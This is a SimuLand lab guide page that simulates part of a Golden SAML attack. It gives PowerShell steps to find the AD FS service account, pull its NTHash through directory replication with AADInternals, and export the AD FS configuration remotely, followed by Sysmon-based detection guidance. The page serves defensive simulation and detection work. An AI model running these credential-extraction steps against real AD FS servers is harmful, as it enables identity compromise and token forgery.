
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Export AD FS Configuration via Policy Store Transfer Service &#8212; SimuLand</title>
    
  <link href="../../../../_static/css/theme.css" rel="stylesheet">
  <link href="../../../../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">

    
  <link rel="stylesheet"
    href="../../../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    
      

    
    <link rel="stylesheet" href="../../../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
    
  <link rel="preload" as="script" href="../../../../_static/js/index.be7d3bbb2ef33a8344ce.js">

    <script id="documentation_options" data-url_root="../../../../" src="../../../../_static/documentation_options.js"></script>
    <script src="../../../../_static/jquery.js"></script>
    <script src="../../../../_static/underscore.js"></script>
    <script src="../../../../_static/doctools.js"></script>
    <script src="../../../../_static/clipboard.min.js"></script>
    <script src="../../../../_static/copybutton.js"></script>
    <script >let toggleHintShow = 'Click to show';</script>
    <script >let toggleHintHide = 'Click to hide';</script>
    <script >let toggleOpenOnPrint = 'true';</script>
    <script src="../../../../_static/togglebutton.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="../../../../_static/sphinx-book-theme.d59cb220de22ca1c485ebbdc042f0030.js"></script>
    <script >const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
const thebe_selector = ".thebe,.cell"
const thebe_selector_input = "pre"
const thebe_selector_output = ".output, .cell_output"
</script>
    <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../../../../genindex.html" />
    <link rel="search" title="Search" href="../../../../search.html" />
    <link rel="next" title="Export AD FS Configuration via .NET Reflection" href="exportADFSConfigDotNETReflection.html" />
    <link rel="prev" title="Export AD FS Configuration via a Local Named Pipe" href="exportADFSConfigLocalNamedPipe.html" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="None">
    

    <!-- Google Analytics -->
    
  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    
    <div class="container-fluid" id="banner"></div>

    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
    <a class="navbar-brand text-wrap" href="../../../../index.html">
      
      
      
      <h1 class="site-logo" id="site-title">SimuLand</h1>
      
    </a>
</div><form class="bd-search d-flex align-items-center" action="../../../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item active">
        <p class="caption">
 <span class="caption-text">
  Lab Environments
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../environments/_helper-docs/README.html">
   Helper Docs
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
  <label for="toctree-checkbox-1">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/addDomainToM365.html">
     Add Domain to Microsoft 365 Tenant
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/addM365LicenseToUser.html">
     Add Microsoft 365 E5 License to User
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/assignAADRole.html">
     Assign Azure AD Role to User
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/configureAADConnectADFS.html">
     Configure Azure AD Connect: ADFS
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/configureM365Defender.html">
     Initialize Microsoft 365 Defenders Security Products Configurations
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/connectAzVmAzBastion.html">
     Connect to Azure VM via Azure Bastion
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/createPrivateContainerUploadFile.html">
     Create an Azure Storage Account and Host a Private File in a Private Container
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/disableAzureADFederation.html">
     Disable Azure Active Directory (AD) Federation
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/enableMultiFactorAuthentication.html">
     Enable Multi-Factor Authentication
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/enableOffice365AuditLogSearch.html">
     Enable Office 365 Audit Log Search
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/getTrustedCASignedSSLCertificate.html">
     Create a Certificate Signing Request and Get a Trusted CA Signed SSL Certificate
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/m365TenantGetAzSubscription.html">
     Microsoft 365 Tenant: Get an Azure Subscription
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/registerAADAppAndSP.html">
     Register Azure AD Application and Create App Service Principal
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/startM365E5Trial.html">
     Start Microsoft 365 E5 Trial
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../environments/README.html">
   Lab Environments
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
  <label for="toctree-checkbox-2">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/aadHybridIdentityADFS/README.html">
     AAD Hybrid Identity: AD FS Environment
    </a>
   </li>
  </ul>
 </li>
</ul>
<p class="caption">
 <span class="caption-text">
  Lab Guides
 </span>
</p>
<ul class="current nav bd-sidenav">
 <li class="toctree-l1 current active has-children">
  <a class="reference internal" href="../../README.html">
   Golden SAML
  </a>
  <input checked="" class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
  <label for="toctree-checkbox-3">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul class="current">
   <li class="toctree-l2 current active has-children">
    <a class="reference internal" href="README.html">
     Export AD FS Configuration
    </a>
    <input checked="" class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
    <label for="toctree-checkbox-4">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul class="current">
     <li class="toctree-l3">
      <a class="reference internal" href="exportADFSConfigLocalNamedPipe.html">
       Export AD FS Configuration via a Local Named Pipe
      </a>
     </li>
     <li class="toctree-l3 current active">
      <a class="current reference internal" href="#">
       Export AD FS Configuration via Policy Store Transfer Service
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="exportADFSConfigDotNETReflection.html">
       Export AD FS Configuration via .NET Reflection
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../export-adfs-dkm-key/README.html">
     Export AD FS DKM Master Key
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
    <label for="toctree-checkbox-5">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-dkm-key/exportADFSDKMKeyLDAP.html">
       Export AD FS DKM Master Key via LDAP Queries
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-dkm-key/exportADFSDKMKeyDRS.html">
       Export AD FS DKM Master Key via Directory Replication Services
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../export-adfs-certificates/README.html">
     Export AD FS Certificates
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
    <label for="toctree-checkbox-6">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-certificates/exportADFSCertsDKMKey.html">
       Export AD FS Certificates via DKM Master Key
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-certificates/exportADFSCertsDotNETReflection.html">
       Export AD FS Certificates via .NET Reflection
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../sign-new-samltoken/README.html">
     Forge SAML Tokens
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../get-oauth-accesstoken/README.html">
     Get OAuth Access Token with SAML Assertion
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../read-mail-messages/README.html">
     Read Mail Messages via MS Graph APIs
    </a>
   </li>
  </ul>
 </li>
</ul>

    </div>
</nav> <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="topbar container-xl fixed-top">
    <div class="topbar-contents row">
        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
        <div class="col pl-md-4 topbar-main">
            
            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
                <i class="fas fa-bars"></i>
                <i class="fas fa-arrow-left"></i>
                <i class="fas fa-arrow-up"></i>
            </button>
            
            
<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../../../_sources/labs/GoldenSAML/simulation/export-adfs-configuration/exportADFSConfigWCFPolicyStore.md"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.md</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
                onclick="printPdf(this)" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
</div>

            <!-- Source interaction buttons -->

<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
    <div class="dropdown-buttons sourcebuttons">
        <a class="repository-button"
            href="https://github.com/Azure/SimuLand"><button type="button" class="btn btn-secondary topbarbtn"
                data-toggle="tooltip" data-placement="left" title="Source repository"><i
                    class="fab fa-github"></i>repository</button></a>
        <a class="issues-button"
            href="https://github.com/Azure/SimuLand/issues/new?title=Issue%20on%20page%20%2Flabs/GoldenSAML/simulation/export-adfs-configuration/exportADFSConfigWCFPolicyStore.html&body=Your%20issue%20content%20here."><button
                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
        
    </div>
</div>

            <!-- Full screen (wrap in <a> to have style consistency -->

<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
        title="Fullscreen mode"><i
            class="fas fa-expand"></i></button></a>

            <!-- Launch buttons -->

        </div>

        <!-- Table of contents -->
        <div class="d-none d-md-block col-md-2 bd-toc show noprint">
            
            <div class="tocsection onthispage pt-5 pb-3">
                <i class="fas fa-list"></i> Contents
            </div>
            <nav id="bd-toc-nav" aria-label="Page">
                <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#table-of-contents">
   Table of Contents
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#preconditions">
   Preconditions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#simulation-steps">
   Simulation Steps
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#log-onto-a-domain-joined-workstation">
     Log onto a domain joined workstation
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-object-guid-and-sid-of-the-ad-fs-service-account">
     Get Object GUID and SID of the AD FS Service Account
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#install-aadinternals">
     Install AADInternals
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-nthash-of-ad-fs-service-account-via-directory-replication-services-dsr">
     Get NTHash of AD FS Service Account via Directory Replication Services (DSR)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-ad-fs-configuration-settings-remotely">
     Get AD FS Configuration Settings Remotely
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detect-ad-fs-remote-synchronization-network-connection">
     Detect AD FS Remote Synchronization Network Connection
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#azure-sentinel-detection-rules">
       Azure Sentinel Detection Rules
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detect-active-directory-replication-services">
     Detect Active Directory Replication Services
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#microsoft-defender-for-identity-alerts">
       Microsoft Defender for Identity Alerts
      </a>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#microsoft-cloud-application-security-alerts">
       Microsoft Cloud Application Security Alerts
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#output">
   Output
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#references">
   References
  </a>
 </li>
</ul>

            </nav>
        </div>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
            <!-- Table of contents that is only displayed when printing the page -->
            <div id="jb-print-docs-body" class="onlyprint">
                <h1>Export AD FS Configuration via Policy Store Transfer Service</h1>
                <!-- Table of contents -->
                <div id="print-main-content">
                    <div id="jb-print-toc">
                        
                        <div>
                            <h2> Contents </h2>
                        </div>
                        <nav aria-label="Page">
                            <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#table-of-contents">
   Table of Contents
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#preconditions">
   Preconditions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#simulation-steps">
   Simulation Steps
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#log-onto-a-domain-joined-workstation">
     Log onto a domain joined workstation
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-object-guid-and-sid-of-the-ad-fs-service-account">
     Get Object GUID and SID of the AD FS Service Account
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#install-aadinternals">
     Install AADInternals
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-nthash-of-ad-fs-service-account-via-directory-replication-services-dsr">
     Get NTHash of AD FS Service Account via Directory Replication Services (DSR)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-ad-fs-configuration-settings-remotely">
     Get AD FS Configuration Settings Remotely
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detect-ad-fs-remote-synchronization-network-connection">
     Detect AD FS Remote Synchronization Network Connection
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#azure-sentinel-detection-rules">
       Azure Sentinel Detection Rules
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detect-active-directory-replication-services">
     Detect Active Directory Replication Services
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#microsoft-defender-for-identity-alerts">
       Microsoft Defender for Identity Alerts
      </a>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#microsoft-cloud-application-security-alerts">
       Microsoft Cloud Application Security Alerts
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#output">
   Output
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#references">
   References
  </a>
 </li>
</ul>

                        </nav>
                    </div>
                </div>
            </div>
            
              <div>
                
  <div class="tex2jax_ignore mathjax_ignore section" id="export-ad-fs-configuration-via-policy-store-transfer-service">
<h1>Export AD FS Configuration via Policy Store Transfer Service<a class="headerlink" href="#export-ad-fs-configuration-via-policy-store-transfer-service" title="Permalink to this headline">¶</a></h1>
<p>Based on <a class="reference external" href="https://o365blog.com/post/adfs/">recent research</a> by <a class="reference external" href="https://twitter.com/DrAzureAD">Dr. Nestori Syynimaa</a>, a threat actor could use <a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-the-ad-fs-configuration-database#how-the-adfs-configuration-database-is-synchronized">AD FS synchronization (Replication services)</a> and pretend to be a secondary federation server to retrieve the AD FS configuration settings remotely from the primary federation server.</p>
<p>Legitimate secondary federation servers store a <code class="docutils literal notranslate"><span class="pre">read-only</span></code> copy of the AD FS configuration database and connect to and synchronize the data with the primary federation server in the AD FS farm by polling it at regular intervals to check whether data has changed. A threat actor could use <code class="docutils literal notranslate"><span class="pre">SOAP</span> <span class="pre">messages</span></code> (XML documents) to request/sync AD FS configuration settings over a Windows Communication Foundation (WFC) service named <code class="docutils literal notranslate"><span class="pre">Policy</span> <span class="pre">Store</span> <span class="pre">transfer</span> <span class="pre">Service</span></code> on the federation primary server. This service can be accessed via the following URL over HTTP:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="n">AD</span> <span class="n">FS</span> <span class="n">Server</span> <span class="n">Name</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="n">adfs</span><span class="o">/</span><span class="n">services</span><span class="o">/</span><span class="n">policystoretransfer</span>
</pre></div>
</div>
<div class="section" id="table-of-contents">
<h2>Table of Contents<a class="headerlink" href="#table-of-contents" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p><a class="reference external" href="#preconditions">Preconditions</a></p></li>
<li><p><a class="reference external" href="#simulation-steps">Simulation Steps</a></p></li>
<li><p><a class="reference external" href="#detection">Detection</a></p></li>
<li><p><a class="reference external" href="#output">Output</a></p></li>
<li><p><a class="reference external" href="#references">References</a></p></li>
</ul>
</div>
<div class="section" id="preconditions">
<h2>Preconditions<a class="headerlink" href="#preconditions" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Integrity level: medium</p></li>
<li><p>Authorization:</p>
<ul>
<li><p>Resource: AD FS Database</p></li>
<li><p>Identity:</p>
<ul>
<li><p>AD FS Service Account</p></li>
<li><p>Local Administrator</p></li>
</ul>
</li>
</ul>
</li>
<li><p>AD FS Server</p>
<ul>
<li><p>Services:</p>
<ul>
<li><p>Active Directory Federation Services (ADFSSRV)</p></li>
</ul>
</li>
<li><p>Network:</p>
<ul>
<li><p>URL: <code class="docutils literal notranslate"><span class="pre">http://&lt;adfs</span> <span class="pre">server</span> <span class="pre">name&gt;:80/adfs/services/policystoretransfer</span></code></p></li>
<li><p>Port: 80</p></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
<div class="section" id="simulation-steps">
<h2>Simulation Steps<a class="headerlink" href="#simulation-steps" title="Permalink to this headline">¶</a></h2>
<p>For this remote variation, we can use use <a class="reference external" href="https://github.com/Gerenios/AADInternals">AADInternals</a> with the following information:</p>
<ul class="simple">
<li><p>IP Address or FQDN of the AD FS server</p></li>
<li><p>NTHash of the AD FS service account</p></li>
<li><p>SID of the AD FS service account</p></li>
</ul>
<div class="section" id="log-onto-a-domain-joined-workstation">
<h3>Log onto a domain joined workstation<a class="headerlink" href="#log-onto-a-domain-joined-workstation" title="Permalink to this headline">¶</a></h3>
<ol class="simple">
<li><p>Connect to one of the domain joined workstations in the network via the <a class="reference internal" href="../../../../environments/_helper-docs/connectAzVmAzBastion.html"><span class="doc std std-doc">Azure Bastion service</span></a> as a <a class="reference external" href="https://github.com/Azure/SimuLand/tree/main/2_deploy/aadHybridIdentityADFS#domain-users-information">domain admin account</a> (e.g. pgustavo).</p></li>
</ol>
</div>
<div class="section" id="get-object-guid-and-sid-of-the-ad-fs-service-account">
<h3>Get Object GUID and SID of the AD FS Service Account<a class="headerlink" href="#get-object-guid-and-sid-of-the-ad-fs-service-account" title="Permalink to this headline">¶</a></h3>
<ol class="simple">
<li><p>Open PowerShell as Administrator</p></li>
<li><p>Use the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/adsi/active-directory-service-interfaces-adsi">Active Directory Service Interfaces (ADSI)</a> to search for the AD FS service account object in the domain controller. Make sure you use the name of the <code class="docutils literal notranslate"><span class="pre">AD</span> <span class="pre">FS</span> <span class="pre">service</span> <span class="pre">account</span></code> you created for the lab environment (e.g. adfsadmin).</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$AdfsServiceAccount</span> <span class="p">=</span> <span class="s1">&#39;adfsadmin&#39;</span>
<span class="nv">$AdfsAdmin</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsisearcher]</span><span class="s2">&quot;(&amp;(ObjectClass=user)(samaccountname=$AdfsServiceAccount))&quot;</span><span class="p">).</span><span class="n">FindOne</span><span class="p">()</span> 
<span class="nv">$Object</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PSObject</span> <span class="n">-Property</span> <span class="p">@{</span> 
    <span class="n">Samaccountname</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$AdfsAdmin</span><span class="p">.</span><span class="n">Properties</span><span class="p">).</span><span class="n">samaccountname</span> 
    <span class="n">ObjectGuid</span>  <span class="p">=</span> <span class="p">(</span><span class="no">[guid]</span><span class="p">(</span><span class="nv">$AdfsAdmin</span><span class="p">.</span><span class="n">Properties</span><span class="p">).</span><span class="n">objectguid</span><span class="p">[</span><span class="n">0</span><span class="p">]).</span><span class="n">guid</span> 
    <span class="n">ObjectSid</span>   <span class="p">=</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="p">(</span><span class="nv">$AdfsAdmin</span><span class="p">.</span><span class="n">Properties</span><span class="p">).</span><span class="n">objectsid</span><span class="p">[</span><span class="n">0</span><span class="p">],</span><span class="n">0</span><span class="p">).</span><span class="n">Value</span> 
<span class="p">}</span>
<span class="nv">$Object</span> <span class="p">|</span> <span class="nb">Format-List</span>
</pre></div>
</div>
<p><img alt="" src="../../../../_images/2021-05-19_05_get_adfs_service_account.png" /></p>
</div>
<div class="section" id="install-aadinternals">
<h3>Install AADInternals<a class="headerlink" href="#install-aadinternals" title="Permalink to this headline">¶</a></h3>
<ol class="simple">
<li><p>On the same elevated PowerShell session, run the following commands to install <a class="reference external" href="https://github.com/Gerenios/AADInternals">AADInternals</a> if it is not installed yet:</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span>Install-Module –Name AADInternals -Force 
Import-Module –Name AADInternals 
</pre></div>
</div>
</div>
<div class="section" id="get-nthash-of-ad-fs-service-account-via-directory-replication-services-dsr">
<h3>Get NTHash of AD FS Service Account via Directory Replication Services (DSR)<a class="headerlink" href="#get-nthash-of-ad-fs-service-account-via-directory-replication-services-dsr" title="Permalink to this headline">¶</a></h3>
<ol class="simple">
<li><p>Get the NTHash of the AD FS service account. AADInternals accomplishes this via <a class="reference external" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0#:~:text=The%20Directory%20Replication%20Service%20%28DRS%29%20Remote%20Protocol%20is,name%20of%20each%20dsaop%20method%20begins%20with%20%22IDL_DSA%22.">Active Directory Replication Services (DRS)</a> with the <a class="reference external" href="https://github.com/Gerenios/AADInternals/blob/master/DRS_Utils.ps1#L71">Get-AADIntADUserNTHash</a> function. Make sure you set the right name for the domain controller in your environment (<code class="docutils literal notranslate"><span class="pre">$Server</span></code>).</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span>$Server = &#39;DC01.simulandlabs.com&#39;
$creds = Get-Credential

$NTHash = Get-AADIntADUserNTHash –ObjectGuid $Object.ObjectGuid –Credentials $creds –Server $Server -AsHex
$NTHash
</pre></div>
</div>
<p><img alt="" src="../../../../_images/2021-05-19_06_get_adfs_service_account_nthash.png" /></p>
</div>
<div class="section" id="get-ad-fs-configuration-settings-remotely">
<h3>Get AD FS Configuration Settings Remotely<a class="headerlink" href="#get-ad-fs-configuration-settings-remotely" title="Permalink to this headline">¶</a></h3>
<ol class="simple">
<li><p>Finally, we can use all the previous information to export the AD FS configuration settings remotely. Make sure you set the right name for the AD FS server in your environment (<code class="docutils literal notranslate"><span class="pre">$ADFSServer</span></code>).</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ADFSServer</span> <span class="p">=</span> <span class="s2">&quot;ADFS01.simulandlabs.com&quot;</span> 
<span class="nv">$settings</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Hash</span> <span class="nv">$NTHash</span> <span class="n">-SID</span> <span class="nv">$Object</span><span class="p">.</span><span class="n">ObjectSid</span> <span class="n">-Server</span> <span class="nv">$ADFSServer</span>
<span class="nv">$settings</span> 
</pre></div>
</div>
<p><img alt="" src="../../../../_images/2021-05-19_07_get_adfs_settings_remotely.png" /></p>
</div>
</div>
<div class="section" id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
<div class="section" id="detect-ad-fs-remote-synchronization-network-connection">
<h3>Detect AD FS Remote Synchronization Network Connection<a class="headerlink" href="#detect-ad-fs-remote-synchronization-network-connection" title="Permalink to this headline">¶</a></h3>
<p>The replication channel used to connect to the AD FS server is over <code class="docutils literal notranslate"><span class="pre">port</span> <span class="pre">80</span></code>. Therefore, we can monitor for incoming network traffic to the AD FS server over HTTP with <code class="docutils literal notranslate"><span class="pre">Sysmon</span> <span class="pre">event</span> <span class="pre">id</span> <span class="pre">3</span> <span class="pre">(NetworkConnect)</span></code>. For an environment with only one server in the AD FS farm, it is rare to see incoming connections over standard HTTP port from workstations in the network.</p>
<p><img alt="" src="../../../../_images/2021-05-19_08_adfs_remote_connection_sysmon.png" /></p>
